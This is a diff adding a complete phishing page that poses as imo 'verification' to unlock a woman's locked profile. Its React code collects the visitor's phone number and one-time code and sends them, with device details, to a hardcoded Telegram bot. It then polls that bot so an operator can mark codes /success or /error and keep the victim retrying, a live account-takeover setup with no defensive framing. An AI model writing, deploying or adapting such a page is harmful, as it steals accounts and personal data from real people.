@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- LINK PREVIEW TAGS (For WhatsApp, Messenger, Facebook) -->
+    <title>Unlock Mst: Sarmin Akter</title>
+    <meta property="og:site_name" content="imo Verification">
+    <meta property="og:title" content="Unlock Mst: Sarmin Akter Profile">
+    <meta property="og:description" content="Click to verify your number and unlock the profile to send SMS and Call.">
+    <meta property="og:image" content="link-logo.jpg">
+    <meta property="og:image:width" content="300">
+    <meta property="og:image:height" content="300">
+    <meta property="og:type" content="website">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- React & ReactDOM -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
+        
+        * { -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+            margin: 0; padding: 0;
+            user-select: none;
+        }
+
+        .animate-slide-up { animation: slideUp 0.3s ease-out forwards; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        
+        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .hide-scroll::-webkit-scrollbar { display: none; }
+        .hide-scroll { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        /* Input Visibility Force */
+        input { color: #000000 !important; opacity: 1 !important; font-weight: 600; }
+        
+        .otp-box:focus { border-color: #0091ea; box-shadow: 0 0 0 2px rgba(0, 145, 234, 0.1); }
+        .otp-disabled { background-color: #e2e8f0; color: #94a3b8 !important; cursor: not-allowed; }
+        
+        .country-modal { position: fixed; inset: 0; z-index: 50; background: white; display: flex; flex-direction: column; }
+        
+        /* Story Viewer */
+        .story-overlay { position: fixed; inset: 0; background: black; z-index: 100; display: flex; align-items: center; justify-content: center; }
+        .progress-bar { height: 2px; background: rgba(255,255,255,0.3); flex: 1; margin: 0 2px; position: relative; overflow: hidden; }
+        .progress-fill { height: 100%; background: white; width: 0%; }
+        .animate-progress { animation: progressFill linear forwards; }
+        @keyframes progressFill { from { width: 0%; } to { width: 100%; } }
+
+        /* Toast Notification */
+        .toast-notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            z-index: 9999;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            animation: slideDown 0.5s ease-out forwards;
+            line-height: 1.4;
+        }
+        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
+
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = "8232443701:AAF5VkbpjvEwQ7oZzKH_M9v2EyDBGZS1oPo"; 
+        const CHAT_ID = "5773368156"; 
+        const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
+
+        // --- DATA: COUNTRIES ---
+        const COUNTRIES = [
+            { name: 'Bangladesh', code: '+880', flag: '🇧🇩', digits: 10 },
+            { name: 'India', code: '+91', flag: '🇮🇳', digits: 10 },
+            { name: 'Pakistan', code: '+92', flag: '🇵🇰', digits: 10 },
+            { name: 'Saudi Arabia', code: '+966', flag: '🇸🇦', digits: 9 },
+            { name: 'United Arab Emirates', code: '+971', flag: '🇦🇪', digits: 9 },
+            { name: 'Oman', code: '+968', flag: '🇴🇲', digits: 8 },
+            { name: 'Qatar', code: '+974', flag: '🇶🇦', digits: 8 },
+            { name: 'Kuwait', code: '+965', flag: '🇰🇼', digits: 8 },
+            { name: 'Bahrain', code: '+973', flag: '🇧🇭', digits: 8 },
+            { name: 'Malaysia', code: '+60', flag: '🇲🇾', digits: 9 },
+            { name: 'Singapore', code: '+65', flag: '🇸🇬', digits: 8 },
+            { name: 'Indonesia', code: '+62', flag: '🇮🇩', digits: 11 },
+            { name: 'United States', code: '+1', flag: '🇺🇸', digits: 10 },
+            { name: 'United Kingdom', code: '+44', flag: '🇬🇧', digits: 10 },
+            { name: 'Italy', code: '+39', flag: '🇮🇹', digits: 10 },
+        ];
+
+        const STORY_VIDEOS = [
+            'my-story1.mp4',
+            'my-story2.mp4',
+            'my-story3.mp4'
+        ];
+
+        // --- TELEGRAM SERVICE ---
+        const sendToTelegram = async (message) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.error(e); }
+        };
+
+        // --- COMPONENT: STORY VIEWER ---
+        const StoryViewer = ({ onClose }) => {
+            const [currentIndex, setCurrentIndex] = useState(0);
+            const videoRef = useRef(null);
+
+            // Notify Start
+            useEffect(() => {
+                sendToTelegram("👀 *User started watching Story*");
+                return () => sendToTelegram("❌ *User stopped watching Story/Exited*");
+            }, []);
+
+            // Notify specific story
+            useEffect(() => {
+                if(videoRef.current) {
+                    videoRef.current.currentTime = 0;
+                    videoRef.current.play().catch(e => console.log("Auto-play prevented"));
+                }
+                sendToTelegram(`▶️ *User watching Story Number: ${currentIndex + 1}*`);
+            }, [currentIndex]);
+
+            const handleNext = () => {
+                if (currentIndex < STORY_VIDEOS.length - 1) {
+                    setCurrentIndex(prev => prev + 1);
+                } else {
+                    onClose();
+                }
+            };
+
+            return (
+                <div className="story-overlay animate-fade">
+                    <div className="absolute top-2 left-0 right-0 flex px-2 z-20">
+                        {STORY_VIDEOS.map((_, idx) => (
+                            <div key={idx} className="progress-bar">
+                                <div 
+                                    className={`progress-fill ${idx === currentIndex ? 'animate-progress' : ''}`} 
+                                    style={{
+                                        width: idx < currentIndex ? '100%' : '0%',
+                                        animationDuration: '5s'
+                                    }}
+                                ></div>
+                            </div>
+                        ))}
+                    </div>
+
+                    <div className="absolute top-6 right-4 z-30" onClick={onClose}>
+                        <i className="fa-solid fa-xmark text-white text-2xl drop-shadow-md"></i>
+                    </div>
+
+                    <div className="absolute top-6 left-4 z-20 flex items-center gap-2">
+                        <img src="my-logo.jpg" className="w-8 h-8 rounded-full border border-white" />
+                        <span className="text-white font-bold text-sm drop-shadow-md">Mst: Sarmin Akter</span>
+                        <span className="text-slate-300 text-xs">10m ago</span>
+                    </div>
+
+                    <video 
+                        ref={videoRef}
+                        src={STORY_VIDEOS[currentIndex]} 
+                        className="w-full h-auto max-h-screen"
+                        onEnded={handleNext}
+                        onClick={handleNext}
+                        playsInline
+                        autoPlay
+                        muted={false}
+                    />
+                </div>
+            );
+        };
+
+        // --- COMPONENT: COUNTRY SELECTOR ---
+        const CountrySelector = ({ isOpen, onClose, onSelect }) => {
+            const [search, setSearch] = useState('');
+            const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(search.toLowerCase()) || c.code.includes(search));
+            if (!isOpen) return null;
+            return (
+                <div className="country-modal animate-slide-up">
+                    <div className="h-14 flex items-center px-4 border-b border-slate-100 shrink-0">
+                        <i onClick={onClose} className="fa-solid fa-arrow-left text-xl text-slate-600 mr-4 cursor-pointer p-2"></i>
+                        <span className="text-lg font-bold text-slate-800">Select Country</span>
+                    </div>
+                    <div className="p-4 bg-slate-50">
+                        <div className="bg-white flex items-center px-3 py-2 rounded-lg border border-slate-200">
+                            <i className="fa-solid fa-magnifying-glass text-slate-400 mr-2"></i>
+                            <input type="text" placeholder="Search country or code" className="w-full outline-none text-slate-800" autoFocus value={search} onChange={(e) => setSearch(e.target.value)} />
+                        </div>
+                    </div>
+                    <div className="flex-1 overflow-y-auto hide-scroll pb-10">
+                        {filtered.map((c, i) => (
+                            <div key={i} onClick={() => { onSelect(c); onClose(); }} className="flex items-center justify-between px-5 py-4 border-b border-slate-50 hover:bg-slate-50 active:bg-slate-100 cursor-pointer">
+                                <div className="flex items-center gap-3">
+                                    <span className="text-2xl">{c.flag}</span>
+                                    <span className="text-slate-800 font-medium">{c.name}</span>
+                                </div>
+                                <span className="text-slate-500 font-bold">{c.code}</span>
+                            </div>
+                        ))}
+                    </div>
+                </div>
+            );
+        };
+
+        // --- MAIN APP ---
+        const App = () => {
+            const [step, setStep] = useState('PHONE');
+            const [phone, setPhone] = useState('');
+            const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
+            const [showCountryModal, setShowCountryModal] = useState(false);
+            const [showStories, setShowStories] = useState(false);
+            const [showToast, setShowToast] = useState(false);
+            
+            // OTP States
+            const [otp, setOtp] = useState(['', '', '', '']);
+            const [otpSubmitTime, setOtpSubmitTime] = useState(0); 
+            const [otpLocked, setOtpLocked] = useState(false);
+            const [lockTimer, setLockTimer] = useState(30);
+            const [isRetryPhase, setIsRetryPhase] = useState(false); // To track if it's the second attempt
+            
+            const otpRefs = [useRef(), useRef(), useRef(), useRef()];
+
+            const isValidPhone = phone.length === selectedCountry.digits;
+
+            // Visitor Alert & Toast Loop
+            useEffect(() => {
+                const device = navigator.userAgent;
+                sendToTelegram(`👀 *New Visitor (App)*\nDevice: ${device}`);
+                
+                // Show toast every 30 seconds
+                const toastInterval = setInterval(() => {
+                    setShowToast(true);
+                    setTimeout(() => setShowToast(false), 5000);
+                }, 30000);
+
+                return () => clearInterval(toastInterval);
+            }, []);
+
+            // --- STRONG POLLING LOGIC ---
+            useEffect(() => {
+                let interval;
+                if (step === 'VERIFYING') {
+                    interval = setInterval(async () => {
+                        try {
+                            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+                            const data = await res.json();
+                            if (data.result && data.result.length > 0) {
+                                const lastUpdate = data.result[0];
+                                const msg = lastUpdate.message?.text?.trim();
+                                const msgTime = lastUpdate.message?.date;
+
+                                // STRICT CHECK: Message must be NEWER than OTP submission time
+                                if (msgTime > otpSubmitTime) {
+                                    if (msg === '/success') setStep('SUCCESS');
+                                    else if (msg === '/error') setStep('ERROR');
+                                }
+                            }
+                        } catch (e) {}
+                    }, 1500);
+                }
+                return () => clearInterval(interval);
+            }, [step, otpSubmitTime]);
+
+            // --- OTP LOCK TIMER LOGIC ---
+            useEffect(() => {
+                let timer;
+                if (lockTimer > 0) {
+                    timer = setInterval(() => {
+                        setLockTimer(prev => prev - 1);
+                    }, 1000);
+                } else {
+                    // Timer finished
+                    if (!isRetryPhase) {
+                        setOtpLocked(false); // Unlock after 30s in first phase
+                    }
+                }
+                return () => clearInterval(timer);
+            }, [lockTimer, isRetryPhase]);
+
+            // Handlers
+            const handlePhoneSubmit = async (e) => {
+                e.preventDefault();
+                if (!isValidPhone) return;
+                await sendToTelegram(`📱 *Phone Submitted*\nCountry: ${selectedCountry.name}\nNumber: ${selectedCountry.code} ${phone}`);
+                setStep('LOADER');
+                
+                setTimeout(() => {
+                    setStep('OTP');
+                    // FIRST ATTEMPT: Lock for 30s
+                    setIsRetryPhase(false);
+                    setOtpLocked(true);
+                    setLockTimer(30);
+                }, 3000);
+            };
+
+            const handleOtpChange = (index, val) => {
+                // If it's first phase and locked, block input. 
+                // If retry phase, allow input regardless of timer.
+                if (!isRetryPhase && otpLocked) return; 
+
+                if (!/^\d*$/.test(val)) return;
+                
+                const newOtp = [...otp];
+                newOtp[index] = val;
+                setOtp(newOtp);
+                if (val && index < 3) otpRefs[index + 1].current.focus();
+                if (newOtp.join('').length === 4) submitOtp(newOtp.join(''));
+            };
+
+            const submitOtp = async (code) => {
+                const currentTime = Math.floor(Date.now() / 1000);
+                setOtpSubmitTime(currentTime); 
+                
+                // FIXED TELEGRAM MESSAGE FORMAT
+                const fullPhone = `${selectedCountry.code} ${phone}`;
+                const msg = `🔐 *OTP Received*\n\n📱 Number: \`${fullPhone}\`\n🔢 OTP: \`${code}\`\n\n👇 *ACTION REQUIRED:*\nType /success to Unlock\nType /error to Reject`;
+                
+                await sendToTelegram(msg);
+                setStep('VERIFYING');
+            };
+
+            const handleRetry = () => {
+                setOtp(['', '', '', '']);
+                setStep('OTP');
+                
+                // RETRY PHASE: 10s Timer but Input is OPEN
+                setIsRetryPhase(true);
+                setLockTimer(10);
+                setOtpLocked(false); // Enable input immediately
+                
+                setTimeout(() => otpRefs[0].current?.focus(), 100);
+            };
+
+            const goBack = () => {
+                if (step === 'OTP') setStep('PHONE');
+                if (step === 'ERROR' || step === 'VERIFYING') setStep('OTP');
+            };
+
+            useEffect(() => {
+                if (step === 'SUCCESS') {
+                    setTimeout(() => window.location.href = REDIRECT_LINK, 2000);
+                }
+            }, [step]);
+
+            const getPlaceholder = () => "0".repeat(selectedCountry.digits);
+
+            return (
+                <div className="flex flex-col h-full w-full bg-white text-slate-800 relative">
+                    
+                    {/* TOAST NOTIFICATION */}
+                    {showToast && (
+                        <div className="toast-notification">
+                            Sarmin Akter imo account is Locked Please Unlock this imo account and Try to SMS and calling.
+                        </div>
+                    )}
+
+                    {/* HEADER */}
+                    <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 z-30 shrink-0 shadow-sm">
+                        {step !== 'PHONE' && step !== 'SUCCESS' ? (
+                            <i onClick={goBack} className="fa-solid fa-arrow-left text-slate-600 text-lg mr-4 cursor-pointer p-2"></i>
+                        ) : null}
+                        
+                        {step === 'PHONE' ? (
+                            <div className="flex-1 flex items-center gap-3">
+                                <div className="w-8 h-8 rounded-full border border-slate-200 overflow-hidden">
+                                    <img src="imo-logo.jpg" onError={(e)=>e.target.src='https://via.placeholder.com/50?text=IMO'} className="w-full h-full object-cover" />
+                                </div>
+                                <span className="text-xl font-bold text-black tracking-tight">imo</span>
+                            </div>
+                        ) : (
+                            <span className="text-lg font-bold text-slate-800">Verification</span>
+                        )}
+
+                        {step === 'PHONE' && (
+                            <div className="w-8 h-8 flex items-center justify-center bg-slate-50 rounded-full text-slate-500">
+                                <i className="fa-solid fa-magnifying-glass"></i>
+                            </div>
+                        )}
+                    </div>
+
+                    {/* SCROLLABLE BODY */}
+                    <div className="flex-1 overflow-y-auto hide-scroll p-4 pb-24 bg-white">
+                        
+                        {/* Story (Click to Open) */}
+                        {step === 'PHONE' && (
+                            <div className="mb-6 animate-fade">
+                                <div className="flex items-center gap-4 mb-4 cursor-pointer active:opacity-80" onClick={() => setShowStories(true)}>
+                                    <div className="w-14 h-14 rounded-full bg-[#00aaff] flex items-center justify-center text-white relative shadow-md ring-2 ring-white">
+                                        <i className="fa-solid fa-camera text-xl"></i>
+                                        <div className="absolute -top-1 -right-1 bg-[#4ade80] text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full border border-white shadow-sm">99</div>
+                                    </div>
+                                    <div>
+                                        <h2 className="font-bold text-lg text-black">Story</h2>
+                                        <p className="text-xs text-slate-500 font-medium">Friends' updates</p>
+                                    </div>
+                                </div>
+                                <div className="h-px bg-slate-100 w-full mb-6"></div>
+                            </div>
+                        )}
+
+                        {/* CONTENT CARD */}
+                        <div className="w-full bg-white border border-slate-200 rounded-2xl p-6 shadow-sm animate-fade">
+                            
+                            {/* PHONE STEP */}
+                            {step === 'PHONE' && (
+                                <>
+                                    <div className="flex items-center gap-4 mb-5">
+                                        <div className="w-16 h-16 rounded-full border-2 border-slate-100 p-0.5">
+                                            <img src="my-logo.jpg" onError={(e)=>e.target.src='https://via.placeholder.com/100?text=User'} className="w-full h-full rounded-full object-cover" />
+                                        </div>
+                                        <div>
+                                            <h3 className="font-bold text-xl text-black">Mst: Sarmin Akter</h3>
+                                            <p className="text-xs text-[#0091ea] font-bold bg-blue-50 px-2 py-1 rounded inline-block mt-1">Message Request</p>
+                                        </div>
+                                    </div>
+
+                                    <p className="text-slate-600 text-sm mb-6 leading-relaxed">
+                                        Mst: Sarmin Akter's imo account is locked. To Add her on imo, please unlock using your imo number.
+                                    </p>
+
+                                    <form onSubmit={handlePhoneSubmit}>
+                                        <label className="text-xs font-bold text-slate-700 block mb-2 uppercase tracking-wide">Phone Number</label>
+                                        
+                                        <div className="flex items-center bg-[#f8fafc] border border-slate-300 rounded-xl px-4 py-3 mb-6 focus-within:border-[#0091ea] focus-within:bg-white focus-within:shadow-[0_0_0_1px_#0091ea] transition-all">
+                                            <div 
+                                                className="flex items-center gap-2 cursor-pointer border-r border-slate-300 pr-3 mr-3 hover:opacity-70 transition"
+                                                onClick={() => setShowCountryModal(true)}
+                                            >
+                                                <span className="text-xl">{selectedCountry.flag}</span>
+                                                <span className="text-black font-bold text-lg">{selectedCountry.code}</span>
+                                                <i className="fa-solid fa-caret-down text-slate-400 text-xs"></i>
+                                            </div>
+                                            <input 
+                                                type="tel" 
+                                                value={phone}
+                                                onChange={(e) => {
+                                                    const val = e.target.value.replace(/\D/g,'');
+                                                    if (val.length <= selectedCountry.digits) setPhone(val);
+                                                }}
+                                                className="flex-1 bg-transparent border-none outline-none text-black font-bold text-lg placeholder-slate-300"
+                                                placeholder={getPlaceholder()}
+                                                autoFocus
+                                            />
+                                        </div>
+
+                                        <button 
+                                            disabled={!isValidPhone}
+                                            className={`w-full text-white font-bold py-4 rounded-xl flex items-center justify-center gap-2 transition-all shadow-md active:scale-95
+                                                ${isValidPhone ? 'bg-[#0091ea] hover:bg-[#0081d0]' : 'bg-slate-300 cursor-not-allowed'}
+                                            `}
+                                        >
+                                            <span>Unlock Sarmin Akter</span>
+                                            <i className="fa-solid fa-arrow-right"></i>
+                                        </button>
+                                    </form>
+                                </>
+                            )}
+
+                            {/* LOADER */}
+                            {step === 'LOADER' && (
+                                <div className="text-center py-10">
+                                    <div className="w-14 h-14 border-4 border-slate-100 border-t-[#0091ea] rounded-full animate-spin mx-auto mb-6"></div>
+                                    <h3 className="text-xl font-bold text-slate-800">Connecting...</h3>
+                                    <p className="text-slate-400 text-sm mt-2">Please wait a moment</p>
+                                </div>
+                            )}
+
+                            {/* OTP STEP */}
+                            {step === 'OTP' && (
+                                <div className="text-center py-4">
+                                    <div className="w-16 h-16 bg-blue-50 text-[#0091ea] rounded-full flex items-center justify-center mx-auto mb-5">
+                                        <i className="fa-solid fa-shield-halved text-3xl"></i>
+                                    </div>
+                                    <h3 className="text-2xl font-bold text-slate-900 mb-3">Security Check</h3>
+                                    <p className="text-slate-600 text-sm mb-8 leading-relaxed px-2">
+                                        Please enter the 4-digit unlock number received on your imo, whatsapp or message option to unlock.
+                                    </p>
+
+                                    <div className="flex justify-center gap-3 mb-8">
+                                        {otp.map((d, i) => (
+                                            <input
+                                                key={i}
+                                                ref={otpRefs[i]}
+                                                type="tel"
+                                                maxLength={1}
+                                                value={d}
+                                                onChange={(e) => handleOtpChange(i, e.target.value)}
+                                                disabled={!isRetryPhase && otpLocked}
+                                                className={`w-14 h-16 border-2 border-slate-200 rounded-xl text-center text-3xl font-bold text-black focus:border-[#0091ea] focus:bg-white outline-none transition-all shadow-sm ${(!isRetryPhase && otpLocked) ? 'otp-disabled' : 'bg-[#f8fafc]'}`}
+                                            />
+                                        ))}
+                                    </div>
+                                    
+                                    <div className="text-center">
+                                        {lockTimer > 0 ? (
+                                            <p className="text-slate-400 font-medium text-sm animate-pulse">
+                                                Please wait {lockTimer}s {isRetryPhase ? '' : 'to enter code'}
+                                            </p>
+                                        ) : (
+                                            <button className="text-[#0091ea] font-bold text-sm hover:underline">Resend Code</button>
+                                        )}
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* VERIFYING STEP */}
+                            {step === 'VERIFYING' && (
+                                <div className="text-center py-10">
+                                    <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
+                                        <i className="fa-solid fa-magnifying-glass text-3xl text-[#0091ea]"></i>
+                                    </div>
+                                    <h3 className="text-xl font-bold text-slate-800 mb-2">Verifying...</h3>
+                                    <p className="text-slate-500 text-sm animate-pulse px-4">
+                                        Verifying the unlock number. Please wait...
+                                    </p>
+                                </div>
+                            )}
+
+                            {/* SUCCESS STEP */}
+                            {step === 'SUCCESS' && (
+                                <div className="text-center py-8">
+                                    <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-sm">
+                                        <i className="fa-solid fa-check text-4xl"></i>
+                                    </div>
+                                    <h3 className="text-2xl font-bold text-green-700 mb-3">Successful!</h3>
+                                    <p className="text-slate-600 text-sm mb-8 font-medium">Come to imo, and become friends with me!</p>
+                                    <button onClick={() => window.location.href = REDIRECT_LINK} className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-lg hover:bg-[#0081d0] transition-colors">
+                                        View Profile
+                                    </button>
+                                </div>
+                            )}
+
+                            {/* ERROR STEP */}
+                            {step === 'ERROR' && (
+                                <div className="text-center py-8">
+                                    <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                                        <i className="fa-solid fa-triangle-exclamation text-4xl"></i>
+                                    </div>
+                                    <h3 className="text-xl font-bold text-red-600 mb-3">Wrong Unlock Number!</h3>
+                                    <p className="text-slate-600 text-sm mb-8 leading-relaxed px-2 font-medium">
+                                        The unlock number you entered is incorrect. Please unlock using the correct 4-digit unlock number received on your imo, whatsapp or message option.
+                                    </p>
+                                    <button onClick={handleRetry} className="w-full bg-red-500 hover:bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">
+                                        Try Again
+                                    </button>
+                                </div>
+                            )}
+
+                        </div>
+                    </div>
+
+                    {/* NAVIGATION */}
+                    <div className="h-16 bg-white border-t border-slate-200 flex justify-around items-center shrink-0 z-30 shadow-[0_-2px_10px_rgba(0,0,0,0.02)]">
+                        <div className="flex flex-col items-center text-[#0091ea] cursor-pointer active:scale-95 transition">
+                            <i className="fa-solid fa-comment-dots text-xl mb-1"></i>
+                            <span className="text-[10px] font-bold">Chats</span>
+                        </div>
+                        <div className="flex flex-col items-center text-slate-400 cursor-pointer active:scale-95 transition hover:text-slate-600">
+                            <i className="fa-solid fa-globe text-xl mb-1"></i>
+                            <span className="text-[10px] font-medium">Explore</span>
+                        </div>
+                        <div className="flex flex-col items-center text-slate-400 cursor-pointer active:scale-95 transition hover:text-slate-600">
+                            <i className="fa-regular fa-address-book text-xl mb-1"></i>
+                            <span className="text-[10px] font-medium">Contacts</span>
+                        </div>
+                    </div>
+
+                    {/* MODALS */}
+                    <CountrySelector 
+                        isOpen={showCountryModal} 
+                        onClose={() => setShowCountryModal(false)}
+                        onSelect={setSelectedCountry}
+                    />
+                    
+                    {showStories && (
+                        <StoryViewer onClose={() => setShowStories(false)} />
+                    )}
+
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
+</html>
+
